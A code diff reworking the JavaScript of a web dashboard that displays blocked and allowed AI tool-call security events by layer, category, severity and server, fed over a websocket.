-function mkBurst(pos,col){if(!T_OK)return;const THREE=window.THREE;const n=12,g=new THREE.BufferGeometry(),a=[];for(let i=0;i<n;i++)a.push(pos.x,pos.y,pos.z);g.setAttribute('position',new THREE.Float32BufferAttribute(a,3));const p=new THREE.Points(g,new THREE.PointsMaterial({color:col,size:0.09,transparent:true}));scene.add(p);const v=[];for(let i=0;i<n;i++)v.push(new THREE.Vector3((Math.random()-.5),(Math.random()-.5),(Math.random()-.5)).normalize().multiplyScalar(0.03+Math.random()*0.04));burst.push({p,g,v,life:1,n})}
-
-// ---------- websocket ----------
-function connect(){const proto=location.protocol==='https:'?'wss:':'ws:';const ws=new WebSocket(`${proto}//${location.host}/ws`);
-  ws.onopen=()=>{S.connected=true;S.reconn=0;setConn('on')};
-  ws.onclose=()=>{S.connected=false;setConn('off');setTimeout(()=>{S.reconn++;setConn('rec');connect()},Math.min(1000*2**S.reconn,8000))};
-  ws.onerror=()=>ws.close();
-  ws.onmessage=e=>{try{const d=JSON.parse(e.data);if(d.type==='snapshot')snap(d);else if(d.type==='security_event')onEvent(d)}catch(_){}};}
-function setConn(s){const d=document.getElementById('dot'),t=document.getElementById('conn-txt');d.className='d';if(s==='on'){t.textContent='connected'}else if(s==='off'){d.classList.add('off');t.textContent='offline'}else{d.classList.add('rec');t.textContent='reconnecting'}}
-function setMode(m){S.mode=m;const el=document.getElementById('mode'),tx=document.getElementById('mode-txt');if(m==='demo'){el.classList.add('demo');tx.textContent='DEMO MODE'}else{el.classList.remove('demo');tx.textContent='LIVE FEED'}}
-
-function snap(d){setMode(d.mode||'live');const st=d.stats||{};
-  S.total=st.total_events||0;S.blocked=st.blocked||0;S.allowed=st.allowed||0;
-  S.byLayer={1:0,2:0,3:0,4:0,5:0,...(st.by_layer||{})};S.byCat={...(st.by_category||{})};S.bySev={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,...(st.by_severity||{})};S.lastCount=S.total;
-  (d.recent_threats||[]).slice(0,60).reverse().forEach(t=>{if(t.risk_score)S.riskSum+=t.risk_score;addRow(t,false)});
-  refresh();}
-function onEvent(e){S.total++;e.blocked?S.blocked++:S.allowed++;S.riskSum+=(e.risk_score||0);
-  if(e.blocked_by_layer&&S.byLayer[e.blocked_by_layer]!==undefined)S.byLayer[e.blocked_by_layer]++;
-  const c=e.category||'unknown';S.byCat[c]=(S.byCat[c]||0)+1;const sv=e.severity||'MEDIUM';if(S.bySev[sv]!==undefined)S.bySev[sv]++;
-  addRow(e,true);fly(e);refresh();}
-
-function refresh(){
-  const rate=S.total>0?((S.blocked/S.total)*100).toFixed(1):'0';
-  document.getElementById('k-total').textContent=S.total.toLocaleString();
-  document.getElementById('k-blocked').textContent=S.blocked.toLocaleString();
-  document.getElementById('k-blocked-d').textContent=S.bySev.CRITICAL+' critical';
-  document.getElementById('k-rate').textContent=rate+'%';
-  document.getElementById('k-risk').textContent=S.total>0?Math.round(S.riskSum/S.total):0;
-  const tot=S.byLayer[1]+S.byLayer[2]+S.byLayer[3]+S.byLayer[4]+S.byLayer[5]||1;
-  document.getElementById('layer-total').textContent=(S.blocked)+' blocks';
-  [1,2,3,4,5].forEach(l=>{document.getElementById('l'+l+'c').textContent=S.byLayer[l];document.getElementById('l'+l+'f').style.width=(S.byLayer[l]/tot*100)+'%'});
-  const sorted=Object.entries(S.byCat).sort((a,b)=>b[1]-a[1]).slice(0,9);const max=sorted.length?sorted[0][1]:1;
-  document.getElementById('vecs').innerHTML=sorted.map(([n,c],i)=>{const col=VECC[i%VECC.length];return `<div class="vec"><div class="vtop"><span class="vdot" style="background:${col}"></span><span class="vn">${n.replace(/_/g,' ')}</span><span class="vc">${c}</span></div><div class="vbar"><i style="width:${(c/max*100).toFixed(0)}%;background:${col}"></i></div></div>`}).join('');
-  document.getElementById('empty').style.display=S.feed>0?'none':'flex';
-}
-function addRow(e,anim){
-  document.getElementById('empty').style.display='none';
-  const rows=document.getElementById('rows');S.feed++;
-  const sc=(e.severity||'medium').toLowerCase();
-  const tm=new Date((e.timestamp||Date.now()/1000)*1000).toLocaleTimeString('en-US',{hour12:false});
-  const vc=e.blocked?'blk':'pass';const vt=e.blocked?'BLOCK':'ALLOW';
-  const layer=e.blocked_by_layer?('L'+e.blocked_by_layer):'—';
-  const find=(e.findings&&e.findings.length)?e.findings[0]:(e.blocked?'policy violation':'clean');
-  const srcTag=e.source?`<span class="src-tag ${e.source}">${e.source}</span>`:'';
-  const risk=e.risk_score||0;const rc=risk>=80?'#f0496e':risk>=50?'#ff9f45':risk>=25?'#f5c451':'#31c48d';
-  const div=document.createElement('div');div.className='erow'+(anim?' enter':'');
-  div.innerHTML=`<span class="c-time">${tm}</span>
-    <span class="chip ${sc}">${(e.severity||'MED').slice(0,4)}</span>
-    <div class="c-tool"><div class="tn">${esc(e.tool_name||e.attack_name||'tool call')}${srcTag}</div><div class="tf">↳ ${esc(find)}</div></div>
-    <span class="c-cat">${esc((e.category||'—').replace(/_/g,' '))}</span>
-    <span class="c-risk" style="color:${rc}">${risk}</span>
-    <span class="c-layer">${layer}</span>
-    <span class="verdict ${vc}">${vt}</span>`;
-  rows.insertBefore(div,rows.firstChild);if(anim)setTimeout(()=>div.classList.remove('enter'),600);
-  while(rows.children.length>150)rows.removeChild(rows.lastChild);
-}
-function esc(s){const d=document.createElement('div');d.textContent=String(s);return d.innerHTML}
-
-setInterval(()=>{const eps=S.total-S.lastCount;S.lastCount=S.total;document.getElementById('k-eps').textContent=eps.toFixed(1);
-  if(proj.length===0&&document.getElementById('flow-status'))document.getElementById('flow-status').textContent=S.connected?'idle':'—';},1000);
-setInterval(()=>{S.uptime++;const u=S.uptime;document.getElementById('k-uptime').textContent=u<60?u+'s':Math.floor(u/60)+'m'},1000);
-setInterval(()=>document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-US',{hour12:false}),1000);
-document.getElementById('clock').textContent=new Date().toLocaleTimeString('en-US',{hour12:false});
-
-init3D();connect();
+const state={total:0,blocked:0,allowed:0,byLayer:{1:0,2:0,3:0,4:0,5:0},byCategory:{},bySeverity:{CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0},sourceCounts:{external:0,demo:0},byServer:{},byTool:{},latency:{samples:0,p95_ms:0},uptime:0,events:[]};
+const colors={1:'#ffbe4f',2:'#32d4ba',3:'#a780ff',4:'#4ea7ff',5:'#ff8d45'};
+const names={1:'Registry',2:'Proxy policy',3:'Kernel guard',4:'Semantic check',5:'Egress policy'};
+const $=id=>document.getElementById(id);const esc=value=>{const d=document.createElement('div');d.textContent=String(value);return d.innerHTML};
+function mergeSnapshot(stats){state.total=stats.total_events||0;state.blocked=stats.blocked||0;state.allowed=stats.allowed||0;state.byLayer={1:0,2:0,3:0,4:0,5:0,...(stats.by_layer||{})};state.byCategory={...(stats.by_category||{})};state.bySeverity={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0,...(stats.by_severity||{})};state.sourceCounts={external:0,demo:0,...(stats.source_counts||{})};state.byServer={...(stats.by_server||{})};state.byTool={...(stats.by_tool||{})};state.latency=stats.latency_ms||{samples:0,p95_ms:0};state.uptime=stats.uptime_seconds||0;render()}
+function applyEvent(event){state.total++;event.blocked?state.blocked++:state.allowed++;if(event.blocked_by_layer)state.byLayer[event.blocked_by_layer]=(state.byLayer[event.blocked_by_layer]||0)+1;const c=event.category||'unknown';state.byCategory[c]=(state.byCategory[c]||0)+1;const s=event.severity||'MEDIUM';state.bySeverity[s]=(state.bySeverity[s]||0)+1;const src=event.source==='demo'?'demo':'external';state.sourceCounts[src]=(state.sourceCounts[src]||0)+1;const server=event.server_id||'unknown';state.byServer[server]=(state.byServer[server]||0)+1;const tool=event.tool_name||'unknown';state.byTool[tool]=(state.byTool[tool]||0)+1;state.events.unshift(event);state.events=state.events.slice(0,100);showPacket(event);render()}
+function setMode(mode){const demo=mode==='demo';$('mode').className='status '+(demo?'demo':'external');$('modeText').textContent=demo?'DEMO WORKLOAD ENABLED':'EXTERNAL TRAFFIC ONLY'}
+function render(){const rate=state.total?state.blocked/state.total*100:0;$('total').textContent=state.total.toLocaleString();$('blocked').textContent=state.blocked.toLocaleString();$('rate').textContent=rate.toFixed(1)+'%';$('critical').textContent=(state.bySeverity.CRITICAL||0)+' critical';$('sources').textContent=`${state.sourceCounts.external||0} external / ${state.sourceCounts.demo||0} demo`;$('p95').textContent=(state.latency.p95_ms||0).toFixed(3)+' ms';$('latSamples').textContent=(state.latency.samples||0)+' sampled decisions';$('eps').textContent=(window.currentEps||0).toFixed(1)+'/s';$('uptime').textContent=formatUptime(state.uptime);$('external').textContent=state.sourceCounts.external||0;$('demo').textContent=state.sourceCounts.demo||0;$('servers').textContent=Object.keys(state.byServer).length;$('tools').textContent=Object.keys(state.byTool).length;const top=Object.entries(state.byCategory).sort((a,b)=>b[1]-a[1])[0];$('category').textContent=top?top[0].replaceAll('_',' '):'none';$('m0').textContent=state.total+' submitted';$('m6').textContent=state.allowed+' allowed';for(let l=1;l<=5;l++)$('m'+l).textContent=(state.byLayer[l]||0)+' intercepts';renderLayers();renderQueue()}
+function renderLayers(){const maximum=Math.max(1,...Object.values(state.byLayer));$('layers').innerHTML=[1,2,3,4,5].map(layer=>`<div class="layerrow"><i style="background:${colors[layer]}"></i><span>${names[layer]}<span class="bar"><b style="width:${(state.byLayer[layer]/maximum*100).toFixed(1)}%;background:${colors[layer]}"></b></span></span><span class="count">${state.byLayer[layer]}</span></div>`).join('')}
+function renderQueue(){const queue=$('queue');$('queueCount').textContent=state.events.length+' retained';if(!state.events.length){$('empty').style.display='block';return}$('empty').style.display='none';queue.querySelectorAll('.event').forEach(node=>node.remove());state.events.slice(0,60).reverse().forEach(event=>{const node=document.createElement('div');const blocked=!!event.blocked;const layer=event.blocked_by_layer?' at L'+event.blocked_by_layer:'';const finding=(event.findings&&event.findings[0])||'clean decision';const source=event.source==='demo'?'demo':'external';node.className='event';node.innerHTML=`<div class="time">${new Date((event.timestamp||Date.now()/1000)*1000).toLocaleTimeString([],{hour12:false})}<br>${event.decision_latency_ms||0} ms</div><div><div class="eventname">${esc(event.tool_name||event.attack_name||'tool call')}<span class="source ${source}">${source}</span></div><div class="eventdetail">${esc(event.server_id||'unknown')} | ${esc(finding)}</div></div><span class="tag ${blocked?'block':'pass'}">${blocked?'BLOCK'+layer:'ALLOW'}</span>`;queue.insertBefore(node,queue.firstChild)})}
+function showPacket(event){const stop=event.blocked&&event.blocked_by_layer?7+(event.blocked_by_layer-1)*14.3:93;const packet=$('packet');packet.className='packet '+(event.blocked?'block':'pass');packet.style.left='7%';for(let n=0;n<=6;n++)$('n'+n).classList.remove('hot','allow');$('n'+(event.blocked?event.blocked_by_layer:6)).classList.add(event.blocked?'hot':'allow');$('lastDecision').textContent=event.blocked?`${event.tool_name||'Tool call'} blocked at Layer ${event.blocked_by_layer}`:`${event.tool_name||'Tool call'} allowed to egress`;$('flowStatus').textContent=event.blocked?'BLOCKED':'ALLOWED';requestAnimationFrame(()=>{packet.classList.add('run');packet.style.left=stop+'%'});setTimeout(()=>packet.classList.remove('run'),1250)}
+function formatUptime(seconds){seconds=Math.floor(seconds||0);if(seconds<60)return seconds+'s';if(seconds<3600)return Math.floor(seconds/60)+'m';return Math.floor(seconds/3600)+'h '+Math.floor(seconds%3600/60)+'m'}
+function connect(){const proto=location.protocol==='https:'?'wss':'ws';const ws=new WebSocket(`${proto}://${location.host}/ws`);ws.onopen=()=>{$('conn').textContent='connected';$('dot').className='dot'};ws.onclose=()=>{$('conn').textContent='reconnecting';$('dot').className='dot off';setTimeout(connect,2000)};ws.onerror=()=>ws.close();ws.onmessage=message=>{try{const data=JSON.parse(message.data);if(data.type==='snapshot'){setMode(data.mode||'external');mergeSnapshot(data.stats||{});state.events=(data.recent_threats||[]).slice();render()}else if(data.type==='security_event')applyEvent(data);else if(data.type==='stats')mergeSnapshot(data)}catch(_){}}}
+setInterval(()=>{$('clock').textContent=new Date().toLocaleTimeString([],{hour12:false});state.uptime++;render()},1000);setInterval(async()=>{try{const stats=await fetch('/api/stats').then(r=>r.json());window.currentEps=stats.events_per_second||0;if(!state.total)mergeSnapshot(stats)}catch(_){}} ,2500);connect();
 </script>
 </body>
 </html>
